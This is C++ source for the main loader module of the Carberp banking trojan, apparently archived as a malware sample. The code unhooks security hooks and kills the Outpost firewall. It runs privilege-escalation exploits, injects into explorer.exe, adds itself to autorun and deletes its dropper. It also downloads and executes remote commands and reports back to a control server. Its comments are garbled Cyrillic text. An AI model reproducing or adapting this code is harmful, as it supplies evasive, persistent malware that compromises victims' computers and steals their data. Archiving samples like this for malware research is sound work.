/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

#include "BotCore.h"

#include "Utils.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Config.h"
#include "Crypt.h"
#include "ntdll.h"
#include "Task.h"
#include "md5.h"
#include "BotDef.h"
#include "Modules.h"
#include "StrConsts.h"



#include "BotDebug.h"

//********************** ���������� ������� **********************************

namespace MAINDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define MDBG MAINDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************




#pragma comment(linker, "/ENTRY:MyMain" )
//#pragma comment(linker, "/ENTRY:ExplorerMain" )



WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������
WCHAR FileToDelete[ MAX_PATH ]; //���� ��� �������� ��������������� ����� ����

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
//DWORD dwExplorerPid  = 0; //��� ����������


//�������� ��� ����������


void InternalAddToAutorun()
{
	// ��������� ��������� � ������������
	// ������ � ������ ���� � ������� �� ��������������� �������
	// ��������������� �� �������� ��������� �������
	#ifndef DEBUGBOT
		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
		if (Mutex)
		{
			pCloseHandle(Mutex);
			MDBG("Main", "������ ����������. ���������� ���������� � ������������.");
			return;
		}

		bool ServiceInstalled = false;
		if (!WSTR::IsEmpty(TempFileName))
		{
				PCHAR Name = WSTR::ToAnsi(TempFileName, 0);

				BOT::Install(Name, false);
				//BOT::InstallService(Name);
				//BOT::AddToAutoRun(Name);
				STR::Free(Name);
		}
	#endif
}


BOOL DeleteDropper() // ������� �������, ������� ����
{
	BOOL Result = FALSE;
	if ( dwKillPid != 0 && !WSTR::IsEmpty(FileToDelete))
	{
		
		pWinStationTerminateProcess(NULL, dwKillPid, DBG_TERMINATE_PROCESS );	
		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
		Result = (BOOL)pDeleteFileW(FileToDelete);
		MDBG("Main", "������� ������ %LS [Result=%d]", FileToDelete, Result);
	}
	return Result;
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	BOT::Initialize();
	
	MDBG("Main", "TestLoaderRoutine ");

	UnhookDlls();


	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	bool FirstSended = false;

	if (InitializeTaskManager(NULL, true))
	{
		for (int i = 1; i <= 1; i++)
		{

			DownloadAndExecuteCommand(NULL, NULL);

			// "������������" �������������� ����������� ���� � ��� �������
			// �������� ��������� ���������� ������ ���� ������ ����� ���������
			// �������
			if (!FirstSended)
			{
				MDBG("Main", "=====>> ���������� ���������� � �������");
				FirstSended = SendFirstInfo();
			}
		}

    }
	pExitProcess(0);
	return 0;
}

void ExplorerMain()
{
	BOT::Initialize();

	// ������� ������� ����������� ���� ��� ������������ ������ 
	// �������� �����������.
	//BOT::TryCreateBotInstance();

//	if ( !dwExplorerSelf )
//		UnhookDlls();

//	InternalAddToAutorun();

	DeleteDropper();


	//----------------------------------------------------

	if ( !dwAlreadyRun )
		MegaJump( LoaderRoutine );
	
	//MegaJump(AvFuckThread);
	
	// 
//	HookZwResumeThread();
//	HookZwQueryDirectoryFile();

	// ������ � ����������� ���� ������ 
}




DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{

	BOT::Initialize();

//	UnhookDlls();

	
	if (dwExplorerSelf) 
	{
		//���� ������ ��� � ���� ��������� �����������	
		dwExplorerSelf = 0;
		if (!InjectIntoExplorer(ExplorerRoutine))
		{
			ExplorerMain();
		}

		pExitProcess(1);
	}
	ExplorerMain();
	return 0;
}



int APIENTRY MyMain() 
{
	BOT::Initialize(); 

	MDBG("Main", "����������� ���. ������ ���� %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
	
	MDBG("Main", "����������� Ring3 ������ ����");
	// ����������� ����3 ������
	BOT::SetBotType(BotRing3);

	// ��������� �� ������� �� �� ������ ���������� ������ ��������� ����
	/*if (BOT::IsRunning())
	{
		pExitProcess(0);
		return 0;
	}*/

	MDBG("Main", "����������� ���. ������ ���� %s", BOT_VERSION);


	UnhookDlls(); //������� ����

	WCHAR ModulePath[MAX_PATH];

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );

	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);
	DWORD dwProcessHash2 = File::GetNameHashW(ModulePath, true);
	
	MDBG( "Main", "� �������� %S, %08x", ModulePath, dwProcessHash2 );

	bool inExplorer = dwProcessHash2 == 0x490A0972 ? true : false; //true ���� ��������� � �������� ����������

	if ( dwProcessHash == BOT::GetBotExeNameHash()) // ������ �� ������ ����
	{
		KillOutpost();
		DWORD dwExploits = SetExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}
		}

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				MegaJump( LoaderRoutine );
			}
		}		
	}
	else
	{
		dwFirst = 1;

		KillOutpost();

		DWORD dwExploits = SetExploits();

		if ( !dwExploits )
		{
			if (MegaJump(LoaderRoutine))
			{
				dwAlreadyRun = 1;
			}

			#ifdef GrabberH
				if ( MegaJump( GrabberThread ) )
					dwGrabberRun = 1;
			#endif 
		}

		dwExplorerSelf = 1;
		if( inExplorer )
		{
			MDBG( "Main", "���������� � �������� explorer.exe" );
			FileToDelete[0] = 0; //���� � �������� ����������, �� ������������ �� �����
			TempFileName[0] = 0;
			dwExplorerSelf = 0;
			RunThread( ExplorerRoutine, 0 );
		}
		else
		{
			m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
			dwKillPid = (DWORD)pGetCurrentProcessId();
			CopyFileToTemp( ModulePath, TempFileName );	
			if (!JmpToExplorer(ExplorerRoutine ) )
			{
				dwExplorerSelf = 0;

				InternalAddToAutorun();
			}
		}
	}

	if( !inExplorer) 
		pExitProcess(1);
	return 1;
}